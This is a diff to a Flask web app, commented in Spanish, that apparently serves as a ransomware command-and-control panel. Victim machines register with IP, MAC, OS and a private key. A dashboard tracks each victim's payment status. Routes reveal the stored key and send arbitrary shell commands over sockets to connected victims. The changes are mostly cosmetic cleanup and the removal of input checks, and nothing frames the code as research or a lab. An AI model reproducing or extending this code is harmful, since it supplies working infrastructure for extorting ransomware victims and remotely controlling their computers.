@@ -17,19 +17,16 @@ def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-
         conn = get_db_connection()
         c = conn.cursor()
         c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
         user = c.fetchone()
         conn.close()
-
         if user:
             session['user'] = username  # Guardar usuario en sesión
             return redirect(url_for('index'))  # Redirigir al dashboard
         else:
             flash("Usuario o contraseña incorrectos", "error")
-
     return render_template('login.html')
 
 @app.route('/logout')
@@ -39,9 +36,8 @@ def logout():
 
 @app.route('/') # Ruta principal 
 def index():
-    if 'user' not in session:  # Verificar si el usuario está logueado
+    if 'user' not in session:  
         return redirect(url_for('login'))
-    
     conn = get_db_connection()
     c = conn.cursor()
     c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
@@ -57,12 +53,7 @@ def register_agent():
     so = request.form.get('so')
     timestamp = request.form.get('timestamp')
     private_key_file = request.files.get('private_key')
-
-    if not ip or not mac or not so or not timestamp or not private_key_file:
-        return jsonify({'error': 'Faltan IP, MAC, SO, timestamp o clave privada'}), 400
-
     private_key_content = private_key_file.read().decode('utf-8')
-
     # Guardar agente en la base de datos
     conn = get_db_connection()
     c = conn.cursor()
@@ -84,15 +75,13 @@ def pay_agent(agent_id):
     if agent_id in connected_agents:
         agent_socket = connected_agents.pop(agent_id)
         agent_socket.close()
-        print(f"Conexión con el agente {agent_id} cerrada tras pago.")
     # Recuperar la lista actualizada de agentes
     c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
     agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4],'timestamp': row[5]} for row in c.fetchall()]
     conn.close()
-
     return render_template('index.html', agents=agents)
 
-@app.route('/view_private_key/<int:agent_id>', methods=['GET'])  # Visualizar clave privada
+@app.route('/view_private_key/<int:agent_id>', methods=['GET']) # Visualizar clave privada
 def view_private_key(agent_id):
     conn = get_db_connection()
     c = conn.cursor()
@@ -123,13 +112,11 @@ def execute_command(agent_id):
     output = None
     if request.method == 'POST':
         command = request.form.get('command')
-        print(f"Recibiendo comando para el agente {agent_id}: {command}")
         # Verificar si el agente está conectado
         if agent_id in connected_agents:
             agent_socket = connected_agents[agent_id]
-            # Si el comando es 'exit', cerramos la conexión
             agent_socket.send(command.encode())
-            if command == 'exit':
+            if command == 'exit': # Si el comando es 'exit', cerramos la conexión
                 agent_socket.close()
                 connected_agents.pop(agent_id, None)  # Eliminar agente de la lista
                 output = f"Conexión con el agente {agent_id} cerrada."
